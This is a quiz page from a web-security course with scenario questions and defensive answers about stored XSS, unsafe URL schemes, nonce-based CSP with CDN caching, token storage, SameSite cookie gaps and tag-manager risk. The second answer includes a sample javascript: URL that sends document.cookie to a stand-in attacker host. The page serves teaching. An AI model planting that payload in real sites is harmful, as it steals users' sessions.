---
title: Web attacks — check yourself
description: Scenario questions about XSS, CSP, CSRF and third-party code.
quizFor: security/web-attacks
---

Think about each scenario before you open the answer. There is rarely one correct option. A good answer names the trade-off.

## 1. "Only our editors write this HTML"

Article bodies come from the [CMS](/data/cms/) (the system editors use to write content) as HTML and are rendered with `dangerouslySetInnerHTML`. A teammate says it is safe because only trusted editors can write content. Do you agree?

<details>
<summary>Answer</summary>

No. "Trusted editors" is a weak boundary: an editor account can be phished, a CMS plugin can have a bug, content can be imported from somewhere else, and a later feature may let other people write into the same field. If any of that happens, the HTML runs as **your site** for every reader: that is stored [XSS](/security/web-attacks/#xss-data-that-becomes-code) (attacker data saved on the server and later run as code in other users' browsers).

Sanitize the HTML with an allowlist sanitizer (such as DOMPurify) right before rendering, and keep a CSP (a header that limits which scripts may run) as the second wall. Even better, get structured content (rich-text JSON) from the CMS and render it with your own components, so no raw HTML reaches the page. The trade-off: a sanitizer may strip some markup the editors want, so agree on the allowed tags.

</details>

## 2. A link in the user profile

Users can set a "website" link on their profile. The profile card is a small widget written without a framework, and it does `link.href = user.website`. The team says the value is "just a URL", so it is safe. Is it?

<details>
<summary>Answer</summary>

No. A user can set the website to `javascript:fetch('https://evil.example?c='+document.cookie)`. When someone clicks the link, the code runs on your origin. The same risk exists wherever a URL from a user reaches the DOM without checks: `location.href = …`, a Markdown renderer, a server template, an email. (Recent React versions block `javascript:` URLs in `href`, but don't count on every layer doing that.)

Validate the **scheme**: accept only values that parse as a URL starting with `https:` or `http:`, both when saving and when rendering. A strict CSP limits the damage if a bug slips through, but scheme validation is the actual fix, and it protects every place the value is used.

</details>

## 3. A strict CSP and a CDN cache

You want a strict, nonce-based [CSP](/security/web-attacks/#csp-limiting-what-can-run) (only scripts that carry a random value, the nonce, may run). But your product pages are rendered once and served from the [CDN](/web-platform/cdn/) cache (shared copies on servers near users) for an hour. What is the conflict, and what are your options?

<details>
<summary>Answer</summary>

A **nonce must be new in every response**. Cached HTML gives every visitor the same nonce, the attacker included, so an injected script can carry the right nonce and the CSP protects nothing.

Options:

- **Hash-based CSP**: allow scripts by the hash of their content. It fits static and cached pages, but every change to an inline script changes the hash, so the build must generate the policy.
- **Rewrite cached HTML at the edge** to insert a fresh nonce into your own trusted script tags. It keeps the cache, but adds an edge step to every request.
- **Render per request**: simple nonces, but you lose the cache and pay in server time.

This is why CSP is an architecture question: it is tied to your [rendering strategy](/architecture/rendering/) and [caching](/architecture/caching/).

</details>

## 4. Tokens in `localStorage` "to avoid CSRF"

A team is worried about [CSRF](/security/web-attacks/#csrf-requests-the-user-didnt-mean) (another site making the browser send a request with the user's cookies). They propose to stop using a session cookie and keep a JWT (a signed token with the user's identity, see [auth](/security/auth/#mental-model-a-credential-checked-on-every-request)) in `localStorage`, sent in the `Authorization` header. What do they gain and what do they lose?

<details>
<summary>Answer</summary>

They gain CSRF protection: the browser doesn't automatically attach a token stored in `localStorage` to requests that another site starts, so a forged request arrives without credentials.

They lose more: any XSS (their own bug, or a compromised third-party script) can now **read the token and send it away**, and the attacker can use it from anywhere until it expires. With an `HttpOnly` cookie, injected code can misuse the session while the page is open, but can't steal it.

For a browser app, an `HttpOnly`, `Secure`, `SameSite=Lax` cookie plus origin checks or CSRF tokens is usually the better choice ([where to keep credentials](/security/auth/#where-the-browser-keeps-credentials)). CSRF has cheap, complete defenses; stolen tokens don't.

</details>

## 5. `SameSite=Lax` is set. Are we done with CSRF?

The session cookie is `SameSite=Lax`. The company also runs `community.shop.example`, a forum where users can post rich content. Is the money-transfer endpoint `POST /transfer` on `shop.example` safe from CSRF?

<details>
<summary>Answer</summary>

Not completely. `SameSite` works with **sites**, and `community.shop.example` is the same site as `shop.example`. If the forum has an XSS bug or lets users embed active content, a request from it is same-site, and the cookie is sent.

Add a second check for state-changing requests: compare the `Origin` header with a fixed list of trusted origins (here, not including the forum), or use the framework's CSRF tokens. `Sec-Fetch-Site` alone isn't enough here: it says `same-site` but not *which* subdomain sent the request, so with an untrusted subdomain treat `same-site` like `cross-site`. If these headers are missing, fall back to the token, never to "allow". And make sure nothing changes state on `GET`, which `Lax` still allows on top-level navigation. Long term, moving user content to a separate registrable domain closes the gap.

</details>

## 6. The tag manager

Marketing loads a tag manager (a vendor script that loads other scripts configured in the vendor's web interface) from a third-party domain on every page, and adds new scripts through it without developers. How big is the risk, and what can you do?

<details>
<summary>Answer</summary>

Every script loaded this way runs with **full rights on your origin**, the same power as XSS. If the vendor's domain or account is compromised, or someone adds a bad tag, every page and every user is affected. The `polyfill.io` case in 2024 is a real example: a domain changed owners and served malicious code to sites that still loaded it.

Options: keep the list of third parties short and review new tags like dependencies; restrict who can publish in the tag manager; use a CSP that limits where scripts load from and where they can send data (`connect-src`); move risky widgets into sandboxed iframes on another origin; and keep tags out of sensitive pages such as checkout and account settings. The trade-off is speed for marketing versus control over code that runs on your site.

</details>
